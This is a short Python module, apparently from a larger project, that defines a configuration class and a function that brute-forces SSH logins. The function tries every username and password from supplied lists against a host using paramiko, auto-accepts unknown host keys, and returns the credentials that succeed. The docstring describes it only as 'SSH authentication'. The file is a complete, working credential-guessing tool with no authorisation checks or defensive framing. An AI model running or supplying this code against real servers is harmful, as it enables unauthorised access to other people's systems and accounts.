from typing_extensions import Literal, TypedDict
from typing import Any, List, Dict, Optional, Union, Tuple
from typing import Dict, Any, List
from pydantic import BaseModel, Field
import paramiko

from typing import Any, List, Dict, Optional
import logging
import asyncio
__all__ = ["SSHBruteForceConfig", "brute_force_ssh"]

class SSHBruteForceConfig(BaseModel):
    host: str = Field(..., description="SSH host to brute force")
    port: int = Field(default=22, description="SSH port")
    usernames: List[str] = Field(..., description="List of usernames to try")
    passwords: List[str] = Field(..., description="List of passwords to try")

def brute_force_ssh(*, config: SSHBruteForceConfig) -> Dict[str, Any]:
    """SSH authentication (RORO, Pydantic, type hints)."""
    successful: List[Dict[str, str]] = []
    for username in config.usernames:
        for password in config.passwords:
            try:
                client = paramiko.SSHClient()
                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                client.connect(config.host, port=config.port, username=username, password=password, timeout=3)
                successful.append({"username": username, "password": password})
                client.close()
            except Exception:
                continue
    return {"host": config.host, "port": config.port, "successful": successful} 